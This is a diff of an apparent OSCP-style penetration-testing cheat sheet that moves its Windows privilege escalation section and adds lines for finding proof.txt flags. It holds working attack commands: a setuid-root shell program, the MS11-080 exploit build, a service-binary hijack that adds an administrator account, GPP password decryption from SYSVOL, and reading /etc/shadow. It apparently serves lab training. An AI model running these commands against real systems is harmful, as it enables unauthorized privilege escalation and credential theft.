@@ -1083,56 +1083,6 @@ export ip=192.168.1.100`**_
         setuid(0);\\nsystem(\\"/bin/sh\\");\\n}" &gt;privsc.c  
         gcc privsc.c -o privsc
 
--   <span id="_jo4fgtcuuk6l" class="anchor"><span id="_Toc480741815" class="anchor"></span></span>Windows Privilege Escalation
-    --------------------------------------------------------------------------------------------------------------------------
-
--   Windows MS11-080 - http://www.exploit-db.com/exploits/18176/  
-    python pyinstaller.py --onefile ms11-080.py  
-    mx11-080.exe -O XP
-
--   Windows Service Configuration Viewer - Check for misconfigurations
-    in services that can lead to privilege escalation. You can replace
-    the executable with your own and have windows execute whatever code
-    you want as the privileged user.  
-    icacls scsiaccess.exe
-
-> scsiaccess.exe  
-> NT AUTHORITY\\SYSTEM:(I)(F)  
-> BUILTIN\\Administrators:(I)(F)  
-> BUILTIN\\Users:(I)(RX)  
-> APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)  
-> Everyone:(I)(F)
-
--   Compile a custom add user command in windows using C  
-    root@kali:~\# cat useradd.c  
-    \#include &lt;stdlib.h&gt; /\* system, NULL, EXIT\_FAILURE \*/  
-    int main ()  
-    {  
-    int i;  
-    i=system ("net localgroup administrators low /add");  
-    return 0;  
-    }  
-      
-    i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
-
--   Group Policy Preferences (GPP)  
-    A common useful misconfiguration found in modern domain environments
-    is unprotected Windows GPP settings files
-
-    -   map the Domain controller SYSVOL share  
-        net use z: \\\\dc01\\SYSVOL
-
-    -   Find the GPP file: Groups.xml  
-        dir /s Groups.xml
-
-    -   Review the contents for passwords  
-        type Groups.xml
-
-    -   Decrypt using GPP Decrypt  
-        gpp-decrypt
-        riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
-
-    -   Local Privilege Escalation Exploit in Windows
 
     -   Spawning a TTY Shell - Break out of Jail or limited shell
          You should almost always upgrade your shell after taking control of an apache or www user.
@@ -1188,6 +1138,63 @@ export ip=192.168.1.100`**_
 
 -   Collect root password  
     cat /etc/shadow |grep root
+    
+-   Find and display the proof.txt or flag.txt - LOOT!
+    `cat ``find / -name proof.txt -print```
+
+-   <span id="_jo4fgtcuuk6l" class="anchor"><span id="_Toc480741815" class="anchor"></span></span>Windows Privilege Escalation
+    --------------------------------------------------------------------------------------------------------------------------
+
+-   Windows MS11-080 - http://www.exploit-db.com/exploits/18176/  
+    python pyinstaller.py --onefile ms11-080.py  
+    mx11-080.exe -O XP
+
+-   Windows Service Configuration Viewer - Check for misconfigurations
+    in services that can lead to privilege escalation. You can replace
+    the executable with your own and have windows execute whatever code
+    you want as the privileged user.  
+    icacls scsiaccess.exe
+
+> scsiaccess.exe  
+> NT AUTHORITY\\SYSTEM:(I)(F)  
+> BUILTIN\\Administrators:(I)(F)  
+> BUILTIN\\Users:(I)(RX)  
+> APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)  
+> Everyone:(I)(F)
+
+-   Compile a custom add user command in windows using C  
+    root@kali:~\# cat useradd.c  
+    \#include &lt;stdlib.h&gt; /\* system, NULL, EXIT\_FAILURE \*/  
+    int main ()  
+    {  
+    int i;  
+    i=system ("net localgroup administrators low /add");  
+    return 0;  
+    }  
+      
+    i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
+
+-   Group Policy Preferences (GPP)  
+    A common useful misconfiguration found in modern domain environments
+    is unprotected Windows GPP settings files
+
+    -   map the Domain controller SYSVOL share  
+        net use z: \\\\dc01\\SYSVOL
+
+    -   Find the GPP file: Groups.xml  
+        dir /s Groups.xml
+
+    -   Review the contents for passwords  
+        type Groups.xml
+
+    -   Decrypt using GPP Decrypt  
+        gpp-decrypt
+        riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
+        
+-   Find and display the proof.txt or flag.txt - get the loot!
+    `cd\`
+    `dir /b /s proof.txt`
+    `type c:\pathto\proof.txt`
 
 <span id="_pht6nag264ji" class="anchor"><span id="_Toc480741816" class="anchor"></span></span>Client, Web and Password Attacks
 ==============================================================================================================================
